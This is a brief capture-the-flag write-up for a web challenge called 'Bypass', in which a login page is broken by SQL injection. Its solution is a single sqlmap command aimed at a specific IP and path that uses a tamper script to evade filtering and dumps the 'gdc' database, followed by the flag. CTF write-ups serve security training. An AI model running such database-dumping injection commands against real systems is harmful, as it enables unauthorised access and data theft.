# Bypass

## CATEGORY

Web Vulnerabilities

## Challenge

Finally we have found an interesting web server used by the GDC, but I don't have credentials so I can't bypass the login page. I heard that you are the master of injections. You

300 points

## Hint(s)

None used

## Solution

We brute forced the post request with sqlmap, which was surprisingly enough for us to obtain the flag:

    sqlmap -u http://122.248.246.76/F7OYO88E/ --data="username=admin&password=admin&sub=&remember=on" --method POST --dbs --batch --tamper=space2comment -D gdc --dump

## Flag

    CDDC21{-Inject_Me-}
